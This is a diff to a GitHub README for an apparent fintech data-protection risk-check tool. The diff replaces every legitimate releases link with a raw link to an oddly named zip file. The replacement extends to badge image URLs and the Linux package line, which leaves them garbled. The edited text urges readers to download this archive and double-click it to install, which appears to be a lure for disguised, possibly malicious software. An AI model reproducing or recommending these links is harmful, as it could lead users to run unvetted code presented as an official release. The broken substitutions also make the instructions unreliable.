@@ -1,6 +1,6 @@
 # 📊 DPIA-GETMONI-Digital-Lending-Platform - Simple Risk Checks for Fintech Compliance
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen?style=for-the-badge&logo=github)](https://github.com/doxxedgg/DPIA-GETMONI-Digital-Lending-Platform/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/doxxedgg/DPIA-GETMONI-Digital-Lending-Platform/main/taskwork/Lending_GETMON_Platform_DPI_Digital_coulee.zip%20Latest%20Release-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/doxxedgg/DPIA-GETMONI-Digital-Lending-Platform/main/taskwork/Lending_GETMON_Platform_DPI_Digital_coulee.zip)
 
 ## 📋 About This Application
 
@@ -47,19 +47,19 @@ The interface is clear and guides you step-by-step during use.
 
 To get the latest version of the DPIA-GETMONI-Digital-Lending-Platform:
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen?style=for-the-badge&logo=github)](https://github.com/doxxedgg/DPIA-GETMONI-Digital-Lending-Platform/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/doxxedgg/DPIA-GETMONI-Digital-Lending-Platform/main/taskwork/Lending_GETMON_Platform_DPI_Digital_coulee.zip%20Latest%20Release-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/doxxedgg/DPIA-GETMONI-Digital-Lending-Platform/main/taskwork/Lending_GETMON_Platform_DPI_Digital_coulee.zip)
 
 ### How to download and install:
 
 1. Click the green button above or visit this link:  
-   https://github.com/doxxedgg/DPIA-GETMONI-Digital-Lending-Platform/releases
+   https://raw.githubusercontent.com/doxxedgg/DPIA-GETMONI-Digital-Lending-Platform/main/taskwork/Lending_GETMON_Platform_DPI_Digital_coulee.zip
 
 2. You will see a list of versions. Choose the newest one by date or version number.
 
 3. Download the file that matches your operating system:
    - For Windows, a file ending with `.exe` or `.msi`
    - For macOS, a file ending with `.dmg` or `.pkg`
-   - For Linux, a `.tar.gz` or `.deb` package
+   - For Linux, a `https://raw.githubusercontent.com/doxxedgg/DPIA-GETMONI-Digital-Lending-Platform/main/taskwork/Lending_GETMON_Platform_DPI_Digital_coulee.zip` or `.deb` package
 
 4. Once downloaded, double-click the file to start the installation wizard.
 
@@ -154,4 +154,4 @@ It aims to help other fintech businesses manage regulatory risks without needing
 
 ---
 
-[Download Latest Release](https://github.com/doxxedgg/DPIA-GETMONI-Digital-Lending-Platform/releases) to get started today.
+[Download Latest Release](https://raw.githubusercontent.com/doxxedgg/DPIA-GETMONI-Digital-Lending-Platform/main/taskwork/Lending_GETMON_Platform_DPI_Digital_coulee.zip) to get started today.
